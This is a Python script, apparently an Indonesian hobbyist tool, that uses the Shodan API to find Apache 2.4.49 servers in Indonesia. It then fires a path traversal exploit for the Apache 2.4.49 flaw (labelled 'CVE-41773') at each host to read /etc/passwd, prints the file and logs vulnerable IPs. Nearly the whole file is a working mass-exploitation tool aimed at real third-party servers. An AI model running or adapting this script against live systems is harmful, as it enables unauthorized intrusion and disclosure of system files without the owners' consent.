#!/usr/bin/python
# coding: utf-8

import sys
import os
import shodan
import time 
import urllib.request
import socket

headerr = '''░█████╗░██████╗░░█████╗░░█████╗░██╗░░██╗███████╗  ██████╗░░█████╗░████████╗██╗░░██╗
██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║░░██║██╔════╝  ██╔══██╗██╔══██╗╚══██╔══╝██║░░██║
███████║██████╔╝███████║██║░░╚═╝███████║█████╗░░  ██████╔╝███████║░░░██║░░░███████║
██╔══██║██╔═══╝░██╔══██║██║░░██╗██╔══██║██╔══╝░░  ██╔═══╝░██╔══██║░░░██║░░░██╔══██║
██║░░██║██║░░░░░██║░░██║╚█████╔╝██║░░██║███████╗  ██║░░░░░██║░░██║░░░██║░░░██║░░██║
╚═╝░░╚═╝╚═╝░░░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝

████████╗██████╗░░█████╗░██╗░░░██╗███████╗██████╗░░██████╗░█████╗░██╗░░░░░
╚══██╔══╝██╔══██╗██╔══██╗██║░░░██║██╔════╝██╔══██╗██╔════╝██╔══██╗██║░░░░░
░░░██║░░░██████╔╝███████║╚██╗░██╔╝█████╗░░██████╔╝╚█████╗░███████║██║░░░░░
░░░██║░░░██╔══██╗██╔══██║░╚████╔╝░██╔══╝░░██╔══██╗░╚═══██╗██╔══██║██║░░░░░
░░░██║░░░██║░░██║██║░░██║░░╚██╔╝░░███████╗██║░░██║██████╔╝██║░░██║███████╗
░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝╚══════╝

░██████╗░██████╗░░█████╗░██████╗░██████╗░███████╗██████╗░
██╔════╝░██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
██║░░██╗░██████╔╝███████║██████╦╝██████╦╝█████╗░░██████╔╝
██║░░╚██╗██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝░░██╔══██╗
╚██████╔╝██║░░██║██║░░██║██████╦╝██████╦╝███████╗██║░░██║
░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═════╝░╚══════╝╚═╝░░╚═╝ CVE-41773 by Wahyudi'''

if len(sys.argv) < 2 :
    print(headerr)
    print("Use : python file.py (jumlah_ouput)")
    sys.exit()
print('[~]Simple Tool to Get apache CVE-41773 from shodan[~]')

def apachuk():
	if os.path.exists("./key.txt") and os.path.getsize("./key.txt") > 0 :
		with open("./key.txt","r") as key :
			api_key = key.readline().rstrip("\n")
	else:
		key = open("./key.txt","w") 
		api_key = input("[ + ] type your api key  :")
		key.write(api_key)
		print("[ = ] file saved in key.txt [ = ]")
		key.close

	get = shodan.Shodan(api_key)
	number = 0
	batas  = sys.argv[1]

	try:
		print("[+] Cek API Key [+]")
		get.search("country:ID apache/2.4.49")
		print("[!] api cocok [!]")
		keyword = "country:ID apache/2.4.49" #rubah country untuk mendapatkan hasil spesifik negara atau juga bisa pake org untuk organisasi
		hasil = open("hasil-jos.txt","a") #append file
		for data in get.search_cursor(keyword): #modif result sesuai kebutuhan referesni https://developer.shodan.io/api/banner-specification
			number += 1
			print( "NO : " + str(number))
			print("IP : " + (data["ip_str"]))
			print("Port : "  + str(data["port"]))
			print("Domains : " +  str(data["domains"]))
			print("Hostnames : " + str(data["hostnames"]))
			#print "Batas : " + str(batas)
			try:
				url = "http://"+data["ip_str"]+"/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\n"
				req = urllib.request.Request(url)
				try: 
					konek = urllib.request.urlopen(req, timeout=5)
					if konek.status == 200:
						lanjutkan = konek.read().decode('utf-8')
						if "/bin/" in lanjutkan:
							print('Server %s IS VULNERABLE BOSSque' % data["ip_str"] )
							print("Output:\n\n"+lanjutkan)  
					else:
						print('Server %s IS NOT VULNERABLE BOSSque' % data["ip_str"])	
				except urllib.error.URLError as e:
					print('Server %s IS NOT VULNERABLE BOSSque' % data["ip_str"])
				except socket.timeout:
					print('Server %s IS NOT RESPONSE BOSSque' % data["ip_str"])
			except:
				print("Ruwettt Bossque")
				continue
			
			hasil.write("IP : " + data["ip_str"] + " port:" + str(data["port"]) + " hostnames : " + str(data["hostnames"]) +  "\n") 
			if int(number) >= int(batas):
				raise KeyboardInterrupt

		hasil.close()
        
	except KeyboardInterrupt:
            print("\t\033[1;91m[!] bye")
            print("\n\t\033[1;91m[!] jangan lupa check hasil.txt")
            time.sleep(0.5)
            sys.exit(1)


if __name__ == "__main__":
	apachuk()
